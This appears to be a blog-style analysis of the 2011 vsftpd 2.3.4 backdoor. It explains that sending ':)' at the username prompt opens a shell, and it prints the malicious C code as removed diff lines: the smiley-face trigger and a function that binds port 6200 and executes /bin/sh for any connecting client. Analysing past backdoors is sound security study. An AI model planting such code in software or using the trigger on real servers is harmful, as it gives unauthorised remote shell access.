### Introduction

Between June 30th - July 1st 2011 a backdoor was introduced into the vsftpd-2.3.4.tar.gz archive this backdoor allowed an attacker to get a bind shell to the system and thus compromising the system. Although the backdoor was removed quickly (July 3rd 2011) a lot of people downloaded this vulnerable version of VSFTPD, causing quite a lot of panic for sysadmins.

### So, how does it work?

In general, it's actually a pretty simple exploit, and whilst there is a Metasploit module you really don't need to use it. The backdoor payload is initiated in response to a user sending `:)` to the server upon being prompted for a username, by sending that smiley face to the server it executes a function which opens a bind shell listener on port 6200 of the affected device.

### Code Review

```
-    else if((p_str->p_buf[i]==0x3a)
-    && (p_str->p_buf[i+1]==0x29))
-    {
-      vsf_sysutil_extra();
-    }
```

As you can see in the above code, we're checking if some input is equal to a certain value, to be specific, we're checking if the user input is equal to `0x3a` and `0x29` if this is true then we're executing `vsf_sysutil_extra();` a quick Google on `0x3a` tells you it's a `:` and a further Google on `0x29` shows a `)` so as you can see there is the smiley face. So, now we know that we have this special input, let's look at the `vsf_sysutil_extra();` function as right now we don't have anything that resembles a vulnerability.

```
-int
-vsf_sysutil_extra(void)
-{
-  int fd, rfd;
-  struct sockaddr_in sa;
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  exit(1);
-  memset(&sa, 0, sizeof(sa));
-  sa.sin_family = AF_INET;
-  sa.sin_port = htons(6200);
-  sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&sa,
-  sizeof(struct sockaddr))) < 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
-  {
-    rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0);
-  }
